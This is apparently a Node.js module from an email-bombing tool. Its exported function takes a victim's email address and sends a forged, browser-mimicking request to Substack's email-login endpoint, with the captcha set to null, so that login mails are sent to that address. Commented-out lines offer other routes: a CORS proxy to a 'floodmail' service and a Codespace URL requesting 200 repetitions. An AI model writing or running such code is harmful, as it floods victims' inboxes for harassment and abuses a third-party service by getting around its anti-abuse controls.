const fetch = require("node-fetch");
const cache = require("./cache.js");
function direct(email) {

fetch("https://substack.com/api/v1/email-login", {
  "headers": {
    "accept": "*/*",
    "accept-language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
    "cache-control": "no-cache",
    "content-type": "application/json",
    "pragma": "no-cache",
    "sec-ch-ua": "\"Chromium\";v=\"116\", \"Not)A;Brand\";v=\"24\", \"Google Chrome\";v=\"116\"",
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "\"Windows\"",
    "sec-fetch-dest": "empty",
    "sec-fetch-mode": "cors",
    "sec-fetch-site": "same-origin"
  },
  "referrer": "https://substack.com/sign-in?redirect=%2F%3Fref%3Dbuffer.com&for_pub=milkkarten",
  "referrerPolicy": "strict-origin-when-cross-origin",
  "body": "{\"redirect\":\"/?ref=buffer.com\",\"for_pub\":\"milkkarten\",\"email\":\"" + email + "\",\"captcha_response\":null}",
  "method": "POST",
  "mode": "cors",
  "credentials": "include"
})
    .then((response) => response.text())
    .then((data) => {})
    .catch((error) => console.error(error));


}

function corsproxy_io(email) {
  fetch("https://corsproxy.io?https://floodmail.net/free/" + email.trim(), {
    headers: {
      accept: "application/json, text/plain, */*",
      "accept-language": "tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7",
      "cache-control": "no-cache",
      pragma: "no-cache",
      "sec-ch-ua":
        '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
      "sec-ch-ua-mobile": "?0",
      "sec-ch-ua-platform": '"Windows"',
      "sec-fetch-dest": "empty",
      "sec-fetch-mode": "cors",
      "sec-fetch-site": "same-origin",
    },
    referrer: "https://floodmail.net",
    referrerPolicy: "strict-origin-when-cross-origin",
    body: "",
    method: "POST",
    mode: "cors",
    credentials: "omit",
  })
    .then((response) => response.text())
    .then((data) => {} /*console.log(data)*/)
    .catch((error) => console.error(error));
}



module.exports = (email) => {
  direct(email);
  // corsproxy_io(email);
  // fetch("https://sturdy-space-system-g4xp7g65447c96gw-3000.app.github.dev/?mail=" + email + "&times=200");
};
